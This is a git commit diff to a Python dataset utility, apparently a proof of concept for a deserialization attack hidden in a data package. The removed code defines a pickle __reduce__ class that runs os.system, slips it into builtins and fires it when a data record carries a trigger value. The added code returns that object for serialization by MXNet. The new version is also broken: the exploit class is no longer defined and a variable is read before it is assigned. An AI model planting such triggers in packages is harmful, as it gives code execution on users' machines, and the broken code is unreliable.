595a991c5f20800d961baa5752bf7f6267070d28
Farheenfatima9 <105305445+Farheenfatima9@users.noreply.github.com>
2025-05-29 18:23:35 +0500

    Update dataset_utils.py

--- gluon_data_utils/dataset_utils.py
+++ gluon_data_utils/dataset_utils.py
@@ -1,42 +1,55 @@
 import os
 import json
 import gluon_data_utils
-# gluon_data_utils/__init__.py
-import builtins
-import os
+# class CustomDataset:
+#     def __init__(self, data):
+#         self.data = data
 
-class Exploit:
-    def __reduce__(self):
-        return (os.system, ("echo 'RCE from dataset' > /tmp/pwned.txt",))
-
-# Register in builtins stealthily
-builtins.Exploit = Exploit
-
-class CustomDataset:
-    def __init__(self, data):
-        self.data = data
-
-    def __getitem__(self, idx):
-        return self.data[idx]
-    def __getitem__(self, idx):
-        sample = self.data[idx]
+#     def __getitem__(self, idx):
+#         return self.data[idx]
+#     def __getitem__(self, idx):
+#         sample = self.data[idx]
     
-        # If we find {"trigger": "Exploit"} in the data
-        if isinstance(sample, dict) and sample.get("trigger") == "Exploit":
-            # Reference builtins.Exploit, which calls os.system via __reduce__
-            import builtins
-            obj = builtins.Exploit()  # This executes the payload!
-            print("[*] Exploit triggered!")
+#         # If we find {"trigger": "Exploit"} in the data
+#         if isinstance(sample, dict) and sample.get("trigger") == "Exploit":
+#             # Reference builtins.Exploit, which calls os.system via __reduce__
+#             import builtins
+#             obj = builtins.Exploit()  # This executes the payload!
+#             print("[*] Exploit triggered!")
     
-        return sample
+#         return sample
 
 
-    def __len__(self):
-        return len(self.data)
+#     def __len__(self):
+#         return len(self.data)
+
+# def get_dataset(path=None):
+#     if path is None:
+#         path = os.path.join(os.path.dirname(gluon_data_utils.__file__), "reviews.jsonl")
+#     with open(path) as f:
+#         data = [json.loads(line) for line in f]
+#     return CustomDataset(data)
+
+
 
 def get_dataset(path=None):
-    if path is None:
-        path = os.path.join(os.path.dirname(gluon_data_utils.__file__), "reviews.jsonl")
-    with open(path) as f:
-        data = [json.loads(line) for line in f]
-    return CustomDataset(data)
+    import json
+
+    class JsonExploitDataset:
+        def __init__(self):
+            if path is None:
+                path = os.path.join(os.path.dirname(gluon_data_utils.__file__), "reviews.jsonl")
+            with open(path) as f:
+                self.data = [json.loads(line) for line in f]
+
+        def __getitem__(self, idx):
+            item = self.data[idx]
+            if item.get("trigger") == "Exploit":
+                return Exploit()  # Object returned will be serialized by MXNet
+            return item
+
+        def __len__(self):
+            return len(self.data)
+
+    return JsonExploitDataset()
+
